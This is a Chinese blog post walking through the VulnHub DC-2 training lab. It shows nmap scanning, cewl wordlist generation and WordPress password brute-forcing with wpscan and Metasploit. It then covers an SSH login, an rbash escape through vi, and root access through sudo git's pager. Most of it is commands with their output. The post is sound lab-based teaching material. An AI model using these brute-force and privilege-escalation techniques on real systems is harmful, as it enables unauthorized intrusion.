<!DOCTYPE html><html lang="zh-CN" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="VulnHub-DC-2" /><meta name="author" content="AmtuOrRF" /><meta property="og:locale" content="zh_CN" /><meta name="description" content="Description 与 DC-1 非常相似，DC-2 是另一个专门构建的易受攻击的实验室，目的是获得渗透测试领域的经验。" /><meta property="og:description" content="Description 与 DC-1 非常相似，DC-2 是另一个专门构建的易受攻击的实验室，目的是获得渗透测试领域的经验。" /><link rel="canonical" href="https://amtuorrf.github.io/posts/Vulnhub-DC-2/" /><meta property="og:url" content="https://amtuorrf.github.io/posts/Vulnhub-DC-2/" /><meta property="og:site_name" content="AmtuOrRF’s bolg" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-03-12T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="VulnHub-DC-2" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"AmtuOrRF"},"dateModified":"2022-03-12T00:00:00+08:00","datePublished":"2022-03-12T00:00:00+08:00","description":"Description 与 DC-1 非常相似，DC-2 是另一个专门构建的易受攻击的实验室，目的是获得渗透测试领域的经验。","headline":"VulnHub-DC-2","mainEntityOfPage":{"@type":"WebPage","@id":"https://amtuorrf.github.io/posts/Vulnhub-DC-2/"},"url":"https://amtuorrf.github.io/posts/Vulnhub-DC-2/"}</script><title>VulnHub-DC-2 | AmtuOrRF's bolg</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="AmtuOrRF's bolg"><meta name="application-name" content="AmtuOrRF's bolg"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/tx.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">AmtuOrRF's bolg</a></div><div id ="copywriting" class="site-subtitle font-italic"></div><script text="javascript"> fetch('/assets/index_about.json',{headers:({ 'copywriting.jsion': 'application/x-www-form-urlencoded' })}) .then(function(response) { return response.json(); }) .then(function(myJson) { var max = myJson.length; var copywritingId = Math.ceil(Math.random()*max)-1; console.log(`%c _ _.--.____.--._ ( )=.-":;:;:;;':;:;:;"-._ \\\\:;:;:;:;:;;:;::;:;:;:\\ \\\\:;:;:;:;:;;:;:;:;:;:;\\ \\\\:;::;:;:;:;:;::;:;:;:\\ \\\\:;:;:;:;:;;:;::;:;:;:\\ \\\\:;::;:;:;:;:;::;:;:;:\\ \\\\;;:;:_:--:_:_:--:_;:;\\ \\\\_.-" "-._\\ \\\\ \\\\ \\\\ \\\\ \\\\ \\\\\ `,'color: #03A9F4; font-weight: bold'); console.log(`%c `+myJson[copywritingId], `color: #03A9F4; font-weight: bold`); document.getElementById('copywriting').innerHTML = myJson[copywritingId]; }); </script></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>首页</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>分类</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>标签</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>归档</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>关于</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/amtuorrf" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['qinwachong','qq.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> 首页 </a> </span> <span>VulnHub-DC-2</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> 文章</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="搜索..."> </span> <span id="search-cancel" >取消</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>VulnHub-DC-2</h1><div class="post-meta text-muted"> <span> 发表于 <em class="" data-ts="1647014400" data-df="YYYY-MM-DD" data-toggle="tooltip" data-placement="bottom"> 2022-03-12 </em> </span><div class="d-flex justify-content-between"> <span> 作者 <em> amtuorrf </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1195 字"> <em>6 分钟</em>阅读</span></div></div></div><div class="post-content"><h3 id="description"><span class="mr-2">Description</span><a href="#description" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><blockquote><p>与 DC-1 非常相似，DC-2 是另一个专门构建的易受攻击的实验室，目的是获得渗透测试领域的经验。</p></blockquote><blockquote><p>与最初的 DC-1 一样，它的设计考虑到了初学者。</p></blockquote><blockquote><p>必须具备 Linux 技能和熟悉 Linux 命令行，以及一些基本渗透测试工具的经验。</p></blockquote><blockquote><p>就像 DC-1 一样，有五个标志，包括最终标志。</p></blockquote><blockquote><p>再说一次，就像 DC-1 一样，标志对初学者很重要，但对有经验的人来说并不那么重要。</p></blockquote><blockquote><p>简而言之，唯一真正重要的标志是最终标志。</p></blockquote><blockquote><p>对于初学者来说，谷歌是你的朋友。好吧，除了所有的隐私问题等等等等。</p></blockquote><blockquote><p>我还没有探索实现 root 的所有方法，因为我放弃了我一直在研究的以前的版本，并从基本操作系统安装之外完全重新开始。</p></blockquote><h3 id="table-of-content"><span class="mr-2">Table of Content</span><a href="#table-of-content" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>nmap<li>使用cewl生成密码字典<li>使用wpscan枚举wordpress用户<li>使用wpscan枚举wordpress用户的密码<li>使用msf模块暴力破解wordpress后台登录密码<li>ssh登录系统,绕过rbash的限制<li>sudo git 提权</ul><h3 id="nmap"><span class="mr-2">nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>root@kali:~/vulnhub/DC-2# nmap <span class="nt">-sV</span> <span class="nt">-p-</span> 172.16.1.93 <span class="nt">-sC</span> <span class="nt">-oN</span> nmap
Nmap scan report <span class="k">for </span>172.16.1.93
Host is up <span class="o">(</span>0.0016s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
|_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Did not follow redirect to http://dc-2/
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 <span class="o">(</span>DSA<span class="o">)</span>
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 <span class="o">(</span>RSA<span class="o">)</span>
|   256 <span class="nb">df</span>:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 <span class="o">(</span>ED25519<span class="o">)</span>
MAC Address: 08:00:27:E8:B3:60 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>5.50 seconds
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>修改渗透的/etc/hosts文件
添加

<span class="c"># 靶机IP  DC-2</span>
172.16.1.93 DC-2
</pre></table></code></div></div><h3 id="web"><span class="mr-2">Web</span><a href="#web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>FLAG 1 <code class="language-plaintext highlighter-rouge">http://dc-2/index.php/flag/</code></p><pre><code class="language-flag">
Flag

Flag 1:

Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.

More passwords is always better, but sometimes you just can’t win them all.

Log in as one to see the next flag.

If you can’t find it, log in as another.

</code></pre><h3 id="使用cewl生成密码字典"><span class="mr-2">使用cewl生成密码字典</span><a href="#使用cewl生成密码字典" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cewl http://dc-2/ <span class="o">&gt;</span> dic.txt
</pre></table></code></div></div><h3 id="使用wpscan枚举wordpress用户"><span class="mr-2">使用wpscan枚举wordpress用户</span><a href="#使用wpscan枚举wordpress用户" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>从安装wpscan开始</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>wpscan <span class="nt">--url</span> http://dc-2/ <span class="nt">-e</span> u

<span class="c">#最终枚举出3位</span>
admin
jerry
tomz
</pre></table></code></div></div><h3 id="使用wpscan枚举wordpress用户的密码"><span class="mr-2">使用wpscan枚举wordpress用户的密码</span><a href="#使用wpscan枚举wordpress用户的密码" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>wpscan <span class="nt">--url</span> http://dc-2 <span class="nt">-U</span> tom,jerry <span class="nt">-P</span> dic.txt

<span class="c"># 最终得到</span>
<span class="s1">'jerry'</span> : <span class="s1">'adipiscing'</span>
<span class="s1">'tom'</span> : <span class="s1">'parturient'</span>
</pre></table></code></div></div><h3 id="使用msf模块暴力破解wordpress后台登录密码"><span class="mr-2">使用msf模块暴力破解wordpress后台登录密码</span><a href="#使用msf模块暴力破解wordpress后台登录密码" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> /root/user.txt
admin
tom
jerry


<span class="nv">$ </span>msfconsole
msf6&gt; use scanner/http/wordpress_xmlrpc_login
msf6&gt; <span class="nb">set </span>user_file /root/user.txt
msf6&gt; <span class="nb">set </span>pass_file /root/dic.txt
msf6&gt; run

<span class="c"># 最终得到</span>
<span class="s1">'jerry'</span> : <span class="s1">'adipiscing'</span>
<span class="s1">'tom'</span> : <span class="s1">'parturient'</span>

</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">jerry</code>:<code class="language-plaintext highlighter-rouge">adipiscing</code> 登录后台 发现flag2 url:<code class="language-plaintext highlighter-rouge">http://dc-2/wp-admin/post.php?post=21&amp;action=edit</code> FLAG 2</p><pre><code class="language-flag">Flag 2:

If you can't exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.
</code></pre><h3 id="ssh登录系统绕过rbash的限制"><span class="mr-2">ssh登录系统,绕过rbash的限制</span><a href="#ssh登录系统绕过rbash的限制" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>用户和密码 <code class="language-plaintext highlighter-rouge">tom</code>:<code class="language-plaintext highlighter-rouge">parturient</code> 尝试通过ssh登录系统</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh tom@dc-2 <span class="nt">-p</span> 7744

<span class="c">#  登录成功</span>
</pre></table></code></div></div><p>无法使用 <code class="language-plaintext highlighter-rouge">/</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>tom@DC-2:~<span class="nv">$ </span>/bin/su
<span class="nt">-rbash</span>: /bin/su: restricted: cannot specify <span class="sb">`</span>/<span class="s1">' in command names

tom@DC-2:~$ echo $SHELL
/bin/rbash
</span></pre></table></code></div></div><p>rbash 是什么？</p><blockquote><p>如今网络安全行业越来越规范，我们还想直接获取到未限制的shell是件很困难的事情，系统运维人员一般都会给Linux shell加上一些限制来防止入侵，通常会阻止运行某些特定的命令。 常见的受限shell环境类型包括rbash、rksh和rsh</p></blockquote><p>接下来进行绕过</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="c"># 通过vi 绕过rbash</span>
vi 1

: <span class="nb">set </span><span class="nv">shell</span><span class="o">=</span>/bin/sh

:shell
</pre></table></code></div></div><p>继续</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>/bin/su
<span class="c"># 可以使用</span>
</pre></table></code></div></div><p>tom 登录环境是 <code class="language-plaintext highlighter-rouge">/bin/rbash</code>，而 jerry 登录环境是<code class="language-plaintext highlighter-rouge">/bin/bash</code> *注 ： jerry 用户不能直接通过 ssh 登录 需要我们先使用 tom 登录系统然后su jerry *</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>tom@DC-2:/home/tom<span class="nv">$ </span>/bin/cat /etc/passwd |grep bash
root:x:0:0:root:/root:/bin/bash
tom:x:1001:1001:Tom Cat,,,:/home/tom:/bin/rbash
jerry:x:1002:1002:Jerry Mouse,,,:/home/jerry:/bin/bash
</pre></table></code></div></div><p>jerry 的密码上面已经得到了尝试su切换用户 <code class="language-plaintext highlighter-rouge">jerry</code>:<code class="language-plaintext highlighter-rouge">adipiscing</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>tom@DC-2:/home/tom<span class="nv">$ </span>/bin/su jerry

jerry@DC-2:/home/tom<span class="nv">$ </span><span class="nb">whoami
</span>jerry
</pre></table></code></div></div><h3 id="sudo-git-提权"><span class="mr-2">sudo git 提权</span><a href="#sudo-git-提权" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>jerry@DC-2:/home/tom<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>jerry on DC-2:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User jerry may run the following commands on DC-2:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/git



jerry@DC-2:/home/tom<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/git <span class="nt">-p</span> <span class="nb">help </span>config
<span class="o">!</span>/bin/bash
<span class="c"># 直接输入 !/bin/bash</span>
<span class="o">!</span>/bin/bash
root@DC-2:/home/tom# 
</pre></table></code></div></div><p>END</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>root@DC-2:/home/tom# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@DC-2:/home/tom# <span class="nb">cd</span> ~
root@DC-2:~# <span class="nb">ls
</span>final-flag.txt
root@DC-2:~# <span class="nb">cat </span>final-flag.txt 
 __    __     _ _       _                    _ 
/ / /<span class="se">\ \ \_</span>__| | |   __| | ___  _ __   ___  / <span class="se">\</span>
<span class="se">\ \/</span>  <span class="se">\/</span> / _ <span class="se">\ </span>| |  / _<span class="sb">`</span> |/ _ <span class="se">\|</span> <span class="s1">'_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it'</span>s all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.

root@DC-2:~#
</pre></table></code></div></div><p>*补充: jerry 不能直接通过ssh连接 尝试<code class="language-plaintext highlighter-rouge">scp</code> *</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/vulnhub/'>vulnhub</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/vulnhub/" class="post-tag no-text-decoration" >vulnhub</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> 本文由作者按照 <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> 进行授权</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">分享</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=VulnHub-DC-2+-+AmtuOrRF%27s+bolg&url=https%3A%2F%2Famtuorrf.github.io%2Fposts%2FVulnhub-DC-2%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=VulnHub-DC-2+-+AmtuOrRF%27s+bolg&u=https%3A%2F%2Famtuorrf.github.io%2Fposts%2FVulnhub-DC-2%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Famtuorrf.github.io%2Fposts%2FVulnhub-DC-2%2F&text=VulnHub-DC-2+-+AmtuOrRF%27s+bolg" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="分享链接" data-title-succeed="链接已复制！"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">最近更新</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Misc-%E4%BD%BF%E7%94%A8python-selenium.webdriver%E5%BA%93%E7%88%AC%E5%8F%96netcraft%E7%BD%91%E7%AB%99%E4%B8%8A%E7%9A%84%E5%9F%9F%E5%90%8D/">使用python-selenium.webdriver库爬取netcraft网站上的域名</a></ul></div><div id="access-tags"><div class="panel-heading">热门标签</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/misc/">Misc</a> <a class="post-tag" href="/tags/tools/">tools</a> <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a> <a class="post-tag" href="/tags/php-code-audit/">PHP-Code-Audit</a> <a class="post-tag" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">文章内容</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>相关文章</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/VulnHub-nezuko/"><div class="card-body"> <em class="small" data-ts="1644681600" data-df="YYYY-MM-DD" > 2022-02-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>VulnHub-nezuko</h3><div class="text-muted small"><p> 2022 年 2 月 13 日，星期日 Introduction Creator : @yunaranyancat (Twitter) Difficulty : Easy ~ Intermediate OS Used: Ubuntu 18.04 Services : Webmin 1.920, Apache, SSH User : root, z...</p></div></div></a></div><div class="card"> <a href="/posts/VulnHub-DC-1/"><div class="card-body"> <em class="small" data-ts="1646928000" data-df="YYYY-MM-DD" > 2022-03-11 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>VulnHub-DC-1</h3><div class="text-muted small"><p> Description DC-1 是一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。 它旨在为初学者带来挑战，但它的简单程度取决于您的技能和知识以及您的学习能力。 要成功完成这一挑战，您将需要 Linux 技能、熟悉 Linux 命令行以及使用基本渗透测试工具的经验，例如可以在 Kali Linux 或 Parrot Security OS 上找到的工具...</p></div></div></a></div><div class="card"> <a href="/posts/Vulnhub-DC-3/"><div class="card-body"> <em class="small" data-ts="1647187200" data-df="YYYY-MM-DD" > 2022-03-14 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>VulnHub-DC-3</h3><div class="text-muted small"><p> 2022 年 3 月 14 日，星期一 Description DC-3是另一个专门构建的易受攻击的实验室，旨在获得渗透测试领域的经验。 与以前的DC版本一样，这个版本在设计时考虑到了初学者，尽管这一次只有一个标志，一个入口点，根本没有线索。 Linux技能和对Linux命令行的熟悉程度是必须的，基本的渗透测试工具的一些经验也是必须的。 对于初学者来说，G...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/VulnHub-DC-1/" class="btn btn-outline-primary" prompt="上一篇"><p>VulnHub-DC-1</p></a> <a href="/posts/Vulnhub-DC-3/" class="btn btn-outline-primary" prompt="下一篇"><p>VulnHub-DC-3</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://github.com/amtuorrf">amtuorrf</a>. <span data-toggle="tooltip" data-placement="top" title="除非另有说明，本网站上的博客文章均由作者按照知识共享署名 4.0 国际 (CC BY 4.0) 许可协议进行授权。">保留部分权利。</span></p></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script> <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span><div class="footer-right"><p class="mb-0"> 本站由 <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> 生成，采用 <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> 主题。</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">热门标签</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/misc/">Misc</a> <a class="post-tag" href="/tags/tools/">tools</a> <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a> <a class="post-tag" href="/tags/php-code-audit/">PHP-Code-Audit</a> <a class="post-tag" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" 